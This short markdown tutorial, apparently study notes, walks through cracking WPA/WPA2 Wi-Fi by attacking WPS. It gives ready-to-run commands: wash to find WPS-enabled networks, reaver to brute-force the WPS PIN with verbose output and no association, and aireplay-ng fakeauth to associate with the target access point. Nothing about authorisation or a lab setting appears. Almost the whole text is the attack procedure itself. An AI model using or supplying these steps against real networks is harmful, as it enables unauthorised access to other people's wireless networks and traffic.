# WPA & WPA-2 Cracking using WPS Feature

First we need to check if the network has WPS enabled
 ```bash
wash --interface wlan0
 ``` 
If this command does not work we can simply use **airodump-ng** to get the information we need
and just make a try for the attack

1. we need to run a reaver command which will do tha WPS cracking for us
 ```bash
reaver --bssid <NetworkMAC> --channel <NetworkChannel> --interface <InterfaceName> - vvv --no-associate
 ``` 
> argument -vvv is to see as much information as possible
> argument --no-associate is to tell reaver we don't want to associate with the network because we are going to do it manually
2. Once the reaver command is launch we need to associate to the network using the **fakeauth** attack
 ```bash
aireplay-ng --fakeauth 30 -a <NetworkMac> -h <InterfaceMac> <InterfaceName>
 ``` 
